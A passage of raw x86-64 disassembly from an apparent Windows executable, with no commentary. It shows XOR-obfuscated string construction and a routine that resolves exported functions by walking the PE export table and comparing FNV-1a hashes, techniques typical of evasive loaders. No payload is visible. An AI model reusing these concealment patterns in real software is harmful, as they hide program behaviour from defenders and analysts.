   140004105:	e8 06 22 00 00       	call   0x140006310
   14000410a:	4c 8d 0d af a7 00 00 	lea    0xa7af(%rip),%r9        # 0x14000e8c0
   140004111:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   140004118:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000411f:	00 
   140004120:	48 ff c1             	inc    %rcx
   140004123:	41 80 3c 09 00       	cmpb   $0x0,(%r9,%rcx,1)
   140004128:	75 f6                	jne    0x140004120
   14000412a:	48 83 3d ee 2d 02 00 	cmpq   $0xf,0x22dee(%rip)        # 0x140026f20
   140004131:	0f 
   140004132:	48 8b c3             	mov    %rbx,%rax
   140004135:	4c 8b c3             	mov    %rbx,%r8
   140004138:	48 0f 47 05 c8 2d 02 	cmova  0x22dc8(%rip),%rax        # 0x140026f08
   14000413f:	00 
   140004140:	c6 00 0a             	movb   $0xa,(%rax)
   140004143:	b8 01 00 00 00       	mov    $0x1,%eax
   140004148:	48 83 3d d0 2d 02 00 	cmpq   $0xf,0x22dd0(%rip)        # 0x140026f20
   14000414f:	0f 
   140004150:	4c 0f 47 05 b0 2d 02 	cmova  0x22db0(%rip),%r8        # 0x140026f08
   140004157:	00 
   140004158:	33 d2                	xor    %edx,%edx
   14000415a:	48 f7 f1             	div    %rcx
   14000415d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140004162:	34 78                	xor    $0x78,%al
   140004164:	41 88 40 01          	mov    %al,0x1(%r8)
   140004168:	4c 8b c3             	mov    %rbx,%r8
   14000416b:	48 83 3d ad 2d 02 00 	cmpq   $0xf,0x22dad(%rip)        # 0x140026f20
   140004172:	0f 
   140004173:	b8 02 00 00 00       	mov    $0x2,%eax
   140004178:	4c 0f 47 05 88 2d 02 	cmova  0x22d88(%rip),%r8        # 0x140026f08
   14000417f:	00 
   140004180:	33 d2                	xor    %edx,%edx
   140004182:	48 f7 f1             	div    %rcx
   140004185:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   14000418a:	34 70                	xor    $0x70,%al
   14000418c:	41 88 40 02          	mov    %al,0x2(%r8)
   140004190:	4c 8b c3             	mov    %rbx,%r8
   140004193:	48 83 3d 85 2d 02 00 	cmpq   $0xf,0x22d85(%rip)        # 0x140026f20
   14000419a:	0f 
   14000419b:	b8 03 00 00 00       	mov    $0x3,%eax
   1400041a0:	4c 0f 47 05 60 2d 02 	cmova  0x22d60(%rip),%r8        # 0x140026f08
   1400041a7:	00 
   1400041a8:	33 d2                	xor    %edx,%edx
   1400041aa:	48 f7 f1             	div    %rcx
   1400041ad:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400041b2:	34 6c                	xor    $0x6c,%al
   1400041b4:	41 88 40 03          	mov    %al,0x3(%r8)
   1400041b8:	4c 8b c3             	mov    %rbx,%r8
   1400041bb:	48 83 3d 5d 2d 02 00 	cmpq   $0xf,0x22d5d(%rip)        # 0x140026f20
   1400041c2:	0f 
   1400041c3:	b8 04 00 00 00       	mov    $0x4,%eax
   1400041c8:	4c 0f 47 05 38 2d 02 	cmova  0x22d38(%rip),%r8        # 0x140026f08
   1400041cf:	00 
   1400041d0:	33 d2                	xor    %edx,%edx
   1400041d2:	48 f7 f1             	div    %rcx
   1400041d5:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400041da:	34 6f                	xor    $0x6f,%al
   1400041dc:	41 88 40 04          	mov    %al,0x4(%r8)
   1400041e0:	4c 8b c3             	mov    %rbx,%r8
   1400041e3:	48 83 3d 35 2d 02 00 	cmpq   $0xf,0x22d35(%rip)        # 0x140026f20
   1400041ea:	0f 
   1400041eb:	b8 05 00 00 00       	mov    $0x5,%eax
   1400041f0:	4c 0f 47 05 10 2d 02 	cmova  0x22d10(%rip),%r8        # 0x140026f08
   1400041f7:	00 
   1400041f8:	33 d2                	xor    %edx,%edx
   1400041fa:	48 f7 f1             	div    %rcx
   1400041fd:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140004202:	34 72                	xor    $0x72,%al
   140004204:	41 88 40 05          	mov    %al,0x5(%r8)
   140004208:	4c 8b c3             	mov    %rbx,%r8
   14000420b:	48 83 3d 0d 2d 02 00 	cmpq   $0xf,0x22d0d(%rip)        # 0x140026f20
   140004212:	0f 
   140004213:	b8 06 00 00 00       	mov    $0x6,%eax
   140004218:	4c 0f 47 05 e8 2c 02 	cmova  0x22ce8(%rip),%r8        # 0x140026f08
   14000421f:	00 
   140004220:	33 d2                	xor    %edx,%edx
   140004222:	48 f7 f1             	div    %rcx
   140004225:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   14000422a:	34 65                	xor    $0x65,%al
   14000422c:	41 88 40 06          	mov    %al,0x6(%r8)
   140004230:	4c 8b c3             	mov    %rbx,%r8
   140004233:	48 83 3d e5 2c 02 00 	cmpq   $0xf,0x22ce5(%rip)        # 0x140026f20
   14000423a:	0f 
   14000423b:	b8 07 00 00 00       	mov    $0x7,%eax
   140004240:	4c 0f 47 05 c0 2c 02 	cmova  0x22cc0(%rip),%r8        # 0x140026f08
   140004247:	00 
   140004248:	33 d2                	xor    %edx,%edx
   14000424a:	48 f7 f1             	div    %rcx
   14000424d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140004252:	34 72                	xor    $0x72,%al
   140004254:	41 88 40 07          	mov    %al,0x7(%r8)
   140004258:	4c 8b c3             	mov    %rbx,%r8
   14000425b:	48 83 3d bd 2c 02 00 	cmpq   $0xf,0x22cbd(%rip)        # 0x140026f20
   140004262:	0f 
   140004263:	b8 08 00 00 00       	mov    $0x8,%eax
   140004268:	4c 0f 47 05 98 2c 02 	cmova  0x22c98(%rip),%r8        # 0x140026f08
   14000426f:	00 
   140004270:	33 d2                	xor    %edx,%edx
   140004272:	48 f7 f1             	div    %rcx
   140004275:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   14000427a:	34 2e                	xor    $0x2e,%al
   14000427c:	41 88 40 08          	mov    %al,0x8(%r8)
   140004280:	4c 8b c3             	mov    %rbx,%r8
   140004283:	48 83 3d 95 2c 02 00 	cmpq   $0xf,0x22c95(%rip)        # 0x140026f20
   14000428a:	0f 
   14000428b:	b8 09 00 00 00       	mov    $0x9,%eax
   140004290:	4c 0f 47 05 70 2c 02 	cmova  0x22c70(%rip),%r8        # 0x140026f08
   140004297:	00 
   140004298:	33 d2                	xor    %edx,%edx
   14000429a:	48 f7 f1             	div    %rcx
   14000429d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400042a2:	34 65                	xor    $0x65,%al
   1400042a4:	41 88 40 09          	mov    %al,0x9(%r8)
   1400042a8:	4c 8b c3             	mov    %rbx,%r8
   1400042ab:	48 83 3d 6d 2c 02 00 	cmpq   $0xf,0x22c6d(%rip)        # 0x140026f20
   1400042b2:	0f 
   1400042b3:	b8 0a 00 00 00       	mov    $0xa,%eax
   1400042b8:	4c 0f 47 05 48 2c 02 	cmova  0x22c48(%rip),%r8        # 0x140026f08
   1400042bf:	00 
   1400042c0:	33 d2                	xor    %edx,%edx
   1400042c2:	48 f7 f1             	div    %rcx
   1400042c5:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400042ca:	34 78                	xor    $0x78,%al
   1400042cc:	41 88 40 0a          	mov    %al,0xa(%r8)
   1400042d0:	4c 8b c3             	mov    %rbx,%r8
   1400042d3:	48 83 3d 45 2c 02 00 	cmpq   $0xf,0x22c45(%rip)        # 0x140026f20
   1400042da:	0f 
   1400042db:	b8 0b 00 00 00       	mov    $0xb,%eax
   1400042e0:	4c 0f 47 05 20 2c 02 	cmova  0x22c20(%rip),%r8        # 0x140026f08
   1400042e7:	00 
   1400042e8:	33 d2                	xor    %edx,%edx
   1400042ea:	48 f7 f1             	div    %rcx
   1400042ed:	48 8b c3             	mov    %rbx,%rax
   1400042f0:	42 0f b6 0c 0a       	movzbl (%rdx,%r9,1),%ecx
   1400042f5:	80 f1 65             	xor    $0x65,%cl
   1400042f8:	41 88 48 0b          	mov    %cl,0xb(%r8)
   1400042fc:	48 83 c4 30          	add    $0x30,%rsp
   140004300:	5b                   	pop    %rbx
   140004301:	c3                   	ret
   140004302:	cc                   	int3
   140004303:	cc                   	int3
   140004304:	cc                   	int3
   140004305:	cc                   	int3
   140004306:	cc                   	int3
   140004307:	cc                   	int3
   140004308:	cc                   	int3
   140004309:	cc                   	int3
   14000430a:	cc                   	int3
   14000430b:	cc                   	int3
   14000430c:	cc                   	int3
   14000430d:	cc                   	int3
   14000430e:	cc                   	int3
   14000430f:	cc                   	int3
   140004310:	40 53                	rex push %rbx
   140004312:	48 83 ec 30          	sub    $0x30,%rsp
   140004316:	48 8d 1d 2b 2b 02 00 	lea    0x22b2b(%rip),%rbx        # 0x140026e48
   14000431d:	ba 0c 00 00 00       	mov    $0xc,%edx
   140004322:	48 8b cb             	mov    %rbx,%rcx
   140004325:	e8 e6 1f 00 00       	call   0x140006310
   14000432a:	4c 8d 0d 97 a5 00 00 	lea    0xa597(%rip),%r9        # 0x14000e8c8
   140004331:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   140004338:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000433f:	00 
   140004340:	48 ff c1             	inc    %rcx
   140004343:	41 80 3c 09 00       	cmpb   $0x0,(%r9,%rcx,1)
   140004348:	75 f6                	jne    0x140004340
   14000434a:	48 83 3d 0e 2b 02 00 	cmpq   $0xf,0x22b0e(%rip)        # 0x140026e60
   140004351:	0f 
   140004352:	48 8b c3             	mov    %rbx,%rax
   140004355:	4c 8b c3             	mov    %rbx,%r8
   140004358:	48 0f 47 05 e8 2a 02 	cmova  0x22ae8(%rip),%rax        # 0x140026e48
   14000435f:	00 
   140004360:	c6 00 3a             	movb   $0x3a,(%rax)
   140004363:	b8 01 00 00 00       	mov    $0x1,%eax
   140004368:	48 83 3d f0 2a 02 00 	cmpq   $0xf,0x22af0(%rip)        # 0x140026e60
   14000436f:	0f 
   140004370:	4c 0f 47 05 d0 2a 02 	cmova  0x22ad0(%rip),%r8        # 0x140026e48
   140004377:	00 
   140004378:	33 d2                	xor    %edx,%edx
   14000437a:	48 f7 f1             	div    %rcx
   14000437d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140004382:	34 5c                	xor    $0x5c,%al
   140004384:	41 88 40 01          	mov    %al,0x1(%r8)
   140004388:	4c 8b c3             	mov    %rbx,%r8
   14000438b:	48 83 3d cd 2a 02 00 	cmpq   $0xf,0x22acd(%rip)        # 0x140026e60
   140004392:	0f 
   140004393:	b8 02 00 00 00       	mov    $0x2,%eax
   140004398:	4c 0f 47 05 a8 2a 02 	cmova  0x22aa8(%rip),%r8        # 0x140026e48
   14000439f:	00 
   1400043a0:	33 d2                	xor    %edx,%edx
   1400043a2:	48 f7 f1             	div    %rcx
   1400043a5:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400043aa:	34 2e                	xor    $0x2e,%al
   1400043ac:	41 88 40 02          	mov    %al,0x2(%r8)
   1400043b0:	4c 8b c3             	mov    %rbx,%r8
   1400043b3:	48 83 3d a5 2a 02 00 	cmpq   $0xf,0x22aa5(%rip)        # 0x140026e60
   1400043ba:	0f 
   1400043bb:	b8 03 00 00 00       	mov    $0x3,%eax
   1400043c0:	4c 0f 47 05 80 2a 02 	cmova  0x22a80(%rip),%r8        # 0x140026e48
   1400043c7:	00 
   1400043c8:	33 d2                	xor    %edx,%edx
   1400043ca:	48 f7 f1             	div    %rcx
   1400043cd:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400043d2:	34 5c                	xor    $0x5c,%al
   1400043d4:	41 88 40 03          	mov    %al,0x3(%r8)
   1400043d8:	4c 8b c3             	mov    %rbx,%r8
   1400043db:	48 83 3d 7d 2a 02 00 	cmpq   $0xf,0x22a7d(%rip)        # 0x140026e60
   1400043e2:	0f 
   1400043e3:	b8 04 00 00 00       	mov    $0x4,%eax
   1400043e8:	4c 0f 47 05 58 2a 02 	cmova  0x22a58(%rip),%r8        # 0x140026e48
   1400043ef:	00 
   1400043f0:	33 d2                	xor    %edx,%edx
   1400043f2:	48 f7 f1             	div    %rcx
   1400043f5:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400043fa:	34 76                	xor    $0x76,%al
   1400043fc:	41 88 40 04          	mov    %al,0x4(%r8)
   140004400:	4c 8b c3             	mov    %rbx,%r8
   140004403:	48 83 3d 55 2a 02 00 	cmpq   $0xf,0x22a55(%rip)        # 0x140026e60
   14000440a:	0f 
   14000440b:	b8 05 00 00 00       	mov    $0x5,%eax
   140004410:	4c 0f 47 05 30 2a 02 	cmova  0x22a30(%rip),%r8        # 0x140026e48
   140004417:	00 
   140004418:	33 d2                	xor    %edx,%edx
   14000441a:	48 f7 f1             	div    %rcx
   14000441d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140004422:	34 69                	xor    $0x69,%al
   140004424:	41 88 40 05          	mov    %al,0x5(%r8)
   140004428:	4c 8b c3             	mov    %rbx,%r8
   14000442b:	48 83 3d 2d 2a 02 00 	cmpq   $0xf,0x22a2d(%rip)        # 0x140026e60
   140004432:	0f 
   140004433:	b8 06 00 00 00       	mov    $0x6,%eax
   140004438:	4c 0f 47 05 08 2a 02 	cmova  0x22a08(%rip),%r8        # 0x140026e48
   14000443f:	00 
   140004440:	33 d2                	xor    %edx,%edx
   140004442:	48 f7 f1             	div    %rcx
   140004445:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   14000444a:	34 72                	xor    $0x72,%al
   14000444c:	41 88 40 06          	mov    %al,0x6(%r8)
   140004450:	4c 8b c3             	mov    %rbx,%r8
   140004453:	48 83 3d 05 2a 02 00 	cmpq   $0xf,0x22a05(%rip)        # 0x140026e60
   14000445a:	0f 
   14000445b:	b8 07 00 00 00       	mov    $0x7,%eax
   140004460:	4c 0f 47 05 e0 29 02 	cmova  0x229e0(%rip),%r8        # 0x140026e48
   140004467:	00 
   140004468:	33 d2                	xor    %edx,%edx
   14000446a:	48 f7 f1             	div    %rcx
   14000446d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140004472:	34 61                	xor    $0x61,%al
   140004474:	41 88 40 07          	mov    %al,0x7(%r8)
   140004478:	4c 8b c3             	mov    %rbx,%r8
   14000447b:	48 83 3d dd 29 02 00 	cmpq   $0xf,0x229dd(%rip)        # 0x140026e60
   140004482:	0f 
   140004483:	b8 08 00 00 00       	mov    $0x8,%eax
   140004488:	4c 0f 47 05 b8 29 02 	cmova  0x229b8(%rip),%r8        # 0x140026e48
   14000448f:	00 
   140004490:	33 d2                	xor    %edx,%edx
   140004492:	48 f7 f1             	div    %rcx
   140004495:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   14000449a:	34 67                	xor    $0x67,%al
   14000449c:	41 88 40 08          	mov    %al,0x8(%r8)
   1400044a0:	4c 8b c3             	mov    %rbx,%r8
   1400044a3:	48 83 3d b5 29 02 00 	cmpq   $0xf,0x229b5(%rip)        # 0x140026e60
   1400044aa:	0f 
   1400044ab:	b8 09 00 00 00       	mov    $0x9,%eax
   1400044b0:	4c 0f 47 05 90 29 02 	cmova  0x22990(%rip),%r8        # 0x140026e48
   1400044b7:	00 
   1400044b8:	33 d2                	xor    %edx,%edx
   1400044ba:	48 f7 f1             	div    %rcx
   1400044bd:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400044c2:	34 74                	xor    $0x74,%al
   1400044c4:	41 88 40 09          	mov    %al,0x9(%r8)
   1400044c8:	4c 8b c3             	mov    %rbx,%r8
   1400044cb:	48 83 3d 8d 29 02 00 	cmpq   $0xf,0x2298d(%rip)        # 0x140026e60
   1400044d2:	0f 
   1400044d3:	b8 0a 00 00 00       	mov    $0xa,%eax
   1400044d8:	4c 0f 47 05 68 29 02 	cmova  0x22968(%rip),%r8        # 0x140026e48
   1400044df:	00 
   1400044e0:	33 d2                	xor    %edx,%edx
   1400044e2:	48 f7 f1             	div    %rcx
   1400044e5:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400044ea:	34 6c                	xor    $0x6c,%al
   1400044ec:	41 88 40 0a          	mov    %al,0xa(%r8)
   1400044f0:	4c 8b c3             	mov    %rbx,%r8
   1400044f3:	48 83 3d 65 29 02 00 	cmpq   $0xf,0x22965(%rip)        # 0x140026e60
   1400044fa:	0f 
   1400044fb:	b8 0b 00 00 00       	mov    $0xb,%eax
   140004500:	4c 0f 47 05 40 29 02 	cmova  0x22940(%rip),%r8        # 0x140026e48
   140004507:	00 
   140004508:	33 d2                	xor    %edx,%edx
   14000450a:	48 f7 f1             	div    %rcx
   14000450d:	48 8b c3             	mov    %rbx,%rax
   140004510:	42 0f b6 0c 0a       	movzbl (%rdx,%r9,1),%ecx
   140004515:	80 f1 74             	xor    $0x74,%cl
   140004518:	41 88 48 0b          	mov    %cl,0xb(%r8)
   14000451c:	48 83 c4 30          	add    $0x30,%rsp
   140004520:	5b                   	pop    %rbx
   140004521:	c3                   	ret
   140004522:	cc                   	int3
   140004523:	cc                   	int3
   140004524:	cc                   	int3
   140004525:	cc                   	int3
   140004526:	cc                   	int3
   140004527:	cc                   	int3
   140004528:	cc                   	int3
   140004529:	cc                   	int3
   14000452a:	cc                   	int3
   14000452b:	cc                   	int3
   14000452c:	cc                   	int3
   14000452d:	cc                   	int3
   14000452e:	cc                   	int3
   14000452f:	cc                   	int3
   140004530:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004535:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000453a:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   14000453f:	8b da                	mov    %edx,%ebx
   140004541:	4c 8b d9             	mov    %rcx,%r11
   140004544:	48 85 c9             	test   %rcx,%rcx
   140004547:	74 7d                	je     0x1400045c6
   140004549:	48 63 41 3c          	movslq 0x3c(%rcx),%rax
   14000454d:	45 33 c9             	xor    %r9d,%r9d
   140004550:	44 8b 84 08 88 00 00 	mov    0x88(%rax,%rcx,1),%r8d
   140004557:	00 
   140004558:	41 8b 7c 08 1c       	mov    0x1c(%r8,%rcx,1),%edi
   14000455d:	45 8b 54 08 20       	mov    0x20(%r8,%rcx,1),%r10d
   140004562:	48 03 f9             	add    %rcx,%rdi
   140004565:	41 8b 74 08 24       	mov    0x24(%r8,%rcx,1),%esi
   14000456a:	4c 03 d1             	add    %rcx,%r10
   14000456d:	45 8b 44 08 18       	mov    0x18(%r8,%rcx,1),%r8d
   140004572:	48 03 f1             	add    %rcx,%rsi
   140004575:	45 85 c0             	test   %r8d,%r8d
   140004578:	74 4c                	je     0x1400045c6
   14000457a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140004580:	41 8b 02             	mov    (%r10),%eax
   140004583:	ba c5 9d 1c 81       	mov    $0x811c9dc5,%edx
   140004588:	49 03 c3             	add    %r11,%rax
   14000458b:	0f b6 08             	movzbl (%rax),%ecx
   14000458e:	84 c9                	test   %cl,%cl
   140004590:	74 24                	je     0x1400045b6
   140004592:	0f 1f 40 00          	nopl   0x0(%rax)
   140004596:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000459d:	00 00 00 
   1400045a0:	0f be c9             	movsbl %cl,%ecx
   1400045a3:	48 8d 40 01          	lea    0x1(%rax),%rax
   1400045a7:	33 ca                	xor    %edx,%ecx
   1400045a9:	69 d1 93 01 00 01    	imul   $0x1000193,%ecx,%edx
   1400045af:	0f b6 08             	movzbl (%rax),%ecx
   1400045b2:	84 c9                	test   %cl,%cl
   1400045b4:	75 ea                	jne    0x1400045a0
   1400045b6:	3b d3                	cmp    %ebx,%edx
   1400045b8:	74 1e                	je     0x1400045d8
   1400045ba:	41 ff c1             	inc    %r9d
   1400045bd:	49 83 c2 04          	add    $0x4,%r10
   1400045c1:	45 3b c8             	cmp    %r8d,%r9d
   1400045c4:	72 ba                	jb     0x140004580
   1400045c6:	33 c0                	xor    %eax,%eax
   1400045c8:	48 8b 5c 24 08       	mov    0x8(%rsp),%rbx
   1400045cd:	48 8b 74 24 10       	mov    0x10(%rsp),%rsi
   1400045d2:	48 8b 7c 24 18       	mov    0x18(%rsp),%rdi
   1400045d7:	c3                   	ret
   1400045d8:	42 0f b7 0c 4e       	movzwl (%rsi,%r9,2),%ecx
   1400045dd:	48 8b 5c 24 08       	mov    0x8(%rsp),%rbx
   1400045e2:	48 8b 74 24 10       	mov    0x10(%rsp),%rsi
   1400045e7:	8b 04 8f             	mov    (%rdi,%rcx,4),%eax
   1400045ea:	48 8b 7c 24 18       	mov    0x18(%rsp),%rdi
   1400045ef:	49 03 c3             	add    %r11,%rax
   1400045f2:	c3                   	ret
   1400045f3:	cc                   	int3
   1400045f4:	cc                   	int3
   1400045f5:	cc                   	int3
   1400045f6:	cc                   	int3
   1400045f7:	cc                   	int3
   1400045f8:	cc                   	int3
   1400045f9:	cc                   	int3
   1400045fa:	cc                   	int3
   1400045fb:	cc                   	int3
   1400045fc:	cc                   	int3
   1400045fd:	cc                   	int3
   1400045fe:	cc                   	int3
   1400045ff:	cc                   	int3
   140004600:	48 8b c4             	mov    %rsp,%rax
   140004603:	48 89 58 18          	mov    %rbx,0x18(%rax)
   140004607:	55                   	push   %rbp
   140004608:	56                   	push   %rsi
   140004609:	57                   	push   %rdi
   14000460a:	41 54                	push   %r12
   14000460c:	41 55                	push   %r13
   14000460e:	41 56                	push   %r14
   140004610:	41 57                	push   %r15
   140004612:	48 8d a8 a8 fd ff ff 	lea    -0x258(%rax),%rbp
   140004619:	48 81 ec 20 03 00 00 	sub    $0x320,%rsp
   140004620:	0f 29 70 b8          	movaps %xmm6,-0x48(%rax)
   140004624:	0f 29 78 a8          	movaps %xmm7,-0x58(%rax)
   140004628:	48 8b 05 11 da 00 00 	mov    0xda11(%rip),%rax        # 0x140012040
   14000462f:	48 33 c4             	xor    %rsp,%rax
   140004632:	48 89 85 f0 01 00 00 	mov    %rax,0x1f0(%rbp)
   140004639:	45 8b f9             	mov    %r9d,%r15d
   14000463c:	4c 8b e2             	mov    %rdx,%r12
   14000463f:	48 8b f9             	mov    %rcx,%rdi
   140004642:	48 89 4d a0          	mov    %rcx,-0x60(%rbp)
   140004646:	45 33 ed             	xor    %r13d,%r13d
   140004649:	44 89 6c 24 50       	mov    %r13d,0x50(%rsp)
   14000464e:	48 8b f1             	mov    %rcx,%rsi
   140004651:	48 83 79 18 0f       	cmpq   $0xf,0x18(%rcx)
   140004656:	76 03                	jbe    0x14000465b
   140004658:	48 8b 31             	mov    (%rcx),%rsi
   14000465b:	48 8b 49 10          	mov    0x10(%rcx),%rcx
   14000465f:	48 85 c9             	test   %rcx,%rcx
   140004662:	74 75                	je     0x1400046d9
   140004664:	48 ff c9             	dec    %rcx
   140004667:	48 c7 c3 ff ff ff ff 	mov    $0xffffffffffffffff,%rbx
   14000466e:	48 3b cb             	cmp    %rbx,%rcx
   140004671:	48 0f 42 d9          	cmovb  %rcx,%rbx
   140004675:	48 ff c3             	inc    %rbx
   140004678:	48 03 de             	add    %rsi,%rbx
   14000467b:	41 b0 2e             	mov    $0x2e,%r8b
   14000467e:	48 8b d3             	mov    %rbx,%rdx
   140004681:	48 8b ce             	mov    %rsi,%rcx
   140004684:	e8 f7 4d 00 00       	call   0x140009480
   140004689:	4c 8b c0             	mov    %rax,%r8
   14000468c:	48 3b c3             	cmp    %rbx,%rax
   14000468f:	74 48                	je     0x1400046d9
   140004691:	4c 2b c6             	sub    %rsi,%r8
   140004694:	49 83 f8 ff          	cmp    $0xffffffffffffffff,%r8
   140004698:	74 3f                	je     0x1400046d9
   14000469a:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000469d:	0f 11 44 24 78       	movups %xmm0,0x78(%rsp)
   1400046a2:	0f 57 c9             	xorps  %xmm1,%xmm1
   1400046a5:	f3 0f 7f 4d 88       	movdqu %xmm1,-0x78(%rbp)
   1400046aa:	4c 39 47 10          	cmp    %r8,0x10(%rdi)
   1400046ae:	4c 0f 42 47 10       	cmovb  0x10(%rdi),%r8
   1400046b3:	48 8b d7             	mov    %rdi,%rdx
   1400046b6:	48 83 7f 18 0f       	cmpq   $0xf,0x18(%rdi)
   1400046bb:	76 03                	jbe    0x1400046c0
   1400046bd:	48 8b 17             	mov    (%rdi),%rdx
   1400046c0:	48 8d 4c 24 78       	lea    0x78(%rsp),%rcx
   1400046c5:	e8 c6 31 00 00       	call   0x140007890
   1400046ca:	48 8d 44 24 78       	lea    0x78(%rsp),%rax
   1400046cf:	bb 81 00 00 00       	mov    $0x81,%ebx
   1400046d4:	e9 ec 00 00 00       	jmp    0x1400047c5
   1400046d9:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400046dc:	0f 11 44 24 30       	movups %xmm0,0x30(%rsp)
   1400046e1:	4c 8b f7             	mov    %rdi,%r14
   1400046e4:	48 83 7f 18 0f       	cmpq   $0xf,0x18(%rdi)
   1400046e9:	76 03                	jbe    0x1400046ee
   1400046eb:	4c 8b 37             	mov    (%rdi),%r14
   1400046ee:	48 8b 77 10          	mov    0x10(%rdi),%rsi
   1400046f2:	48 bb ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rbx
   1400046f9:	ff ff 7f 
   1400046fc:	48 3b f3             	cmp    %rbx,%rsi
   1400046ff:	0f 87 eb 07 00 00    	ja     0x140004ef0
   140004705:	48 83 fe 0f          	cmp    $0xf,%rsi
   140004709:	77 1c                	ja     0x140004727
   14000470b:	48 89 74 24 40       	mov    %rsi,0x40(%rsp)
   140004710:	48 c7 44 24 48 0f 00 	movq   $0xf,0x48(%rsp)
   140004717:	00 00 
   140004719:	41 0f 10 06          	movups (%r14),%xmm0
   14000471d:	0f 11 44 24 30       	movups %xmm0,0x30(%rsp)
   140004722:	e9 94 00 00 00       	jmp    0x1400047bb
   140004727:	48 8b c6             	mov    %rsi,%rax
   14000472a:	48 83 c8 0f          	or     $0xf,%rax
   14000472e:	48 3b c3             	cmp    %rbx,%rax
   140004731:	76 30                	jbe    0x140004763
   140004733:	48 b8 00 00 00 00 00 	movabs $0x8000000000000000,%rax
   14000473a:	00 00 80 
   14000473d:	48 83 c0 27          	add    $0x27,%rax
   140004741:	48 8b c8             	mov    %rax,%rcx
   140004744:	e8 37 3e 00 00       	call   0x140008580
   140004749:	48 8b c8             	mov    %rax,%rcx
   14000474c:	48 85 c0             	test   %rax,%rax
   14000474f:	0f 84 f0 06 00 00    	je     0x140004e45
   140004755:	48 83 c0 27          	add    $0x27,%rax
   140004759:	48 83 e0 e0          	and    $0xffffffffffffffe0,%rax
   14000475d:	48 89 48 f8          	mov    %rcx,-0x8(%rax)
   140004761:	eb 3a                	jmp    0x14000479d
   140004763:	48 8b d8             	mov    %rax,%rbx
   140004766:	b9 16 00 00 00       	mov    $0x16,%ecx
   14000476b:	48 3b c1             	cmp    %rcx,%rax
   14000476e:	48 0f 42 d9          	cmovb  %rcx,%rbx
   140004772:	48 8d 4b 01          	lea    0x1(%rbx),%rcx
   140004776:	48 85 c9             	test   %rcx,%rcx
   140004779:	75 05                	jne    0x140004780
   14000477b:	49 8b c5             	mov    %r13,%rax
   14000477e:	eb 1d                	jmp    0x14000479d
   140004780:	48 81 f9 00 10 00 00 	cmp    $0x1000,%rcx
   140004787:	72 0f                	jb     0x140004798
   140004789:	48 8d 41 27          	lea    0x27(%rcx),%rax
   14000478d:	48 3b c1             	cmp    %rcx,%rax
   140004790:	0f 86 60 07 00 00    	jbe    0x140004ef6
   140004796:	eb a9                	jmp    0x140004741
   140004798:	e8 e3 3d 00 00       	call   0x140008580
   14000479d:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   1400047a2:	48 89 74 24 40       	mov    %rsi,0x40(%rsp)
   1400047a7:	48 89 5c 24 48       	mov    %rbx,0x48(%rsp)
   1400047ac:	4c 8d 46 01          	lea    0x1(%rsi),%r8
   1400047b0:	49 8b d6             	mov    %r14,%rdx
   1400047b3:	48 8b c8             	mov    %rax,%rcx
   1400047b6:	e8 30 4d 00 00       	call   0x1400094eb
   1400047bb:	48 8d 44 24 30       	lea    0x30(%rsp),%rax
   1400047c0:	bb 02 00 00 00       	mov    $0x2,%ebx
   1400047c5:	0f 10 38             	movups (%rax),%xmm7
   1400047c8:	0f 11 bd e0 00 00 00 	movups %xmm7,0xe0(%rbp)
   1400047cf:	0f 10 70 10          	movups 0x10(%rax),%xmm6
   1400047d3:	0f 11 b5 f0 00 00 00 	movups %xmm6,0xf0(%rbp)
   1400047da:	4c 89 68 10          	mov    %r13,0x10(%rax)
   1400047de:	48 c7 40 18 0f 00 00 	movq   $0xf,0x18(%rax)
   1400047e5:	00 
   1400047e6:	c6 00 00             	movb   $0x0,(%rax)
   1400047e9:	f6 c3 02             	test   $0x2,%bl
   1400047ec:	74 53                	je     0x140004841
   1400047ee:	83 e3 fd             	and    $0xfffffffd,%ebx
   1400047f1:	48 8b 54 24 48       	mov    0x48(%rsp),%rdx
   1400047f6:	48 83 fa 0f          	cmp    $0xf,%rdx
   1400047fa:	76 45                	jbe    0x140004841
   1400047fc:	48 ff c2             	inc    %rdx
   1400047ff:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140004804:	48 8b c1             	mov    %rcx,%rax
   140004807:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   14000480e:	72 2b                	jb     0x14000483b
   140004810:	48 83 c2 27          	add    $0x27,%rdx
   140004814:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   140004818:	48 2b c1             	sub    %rcx,%rax
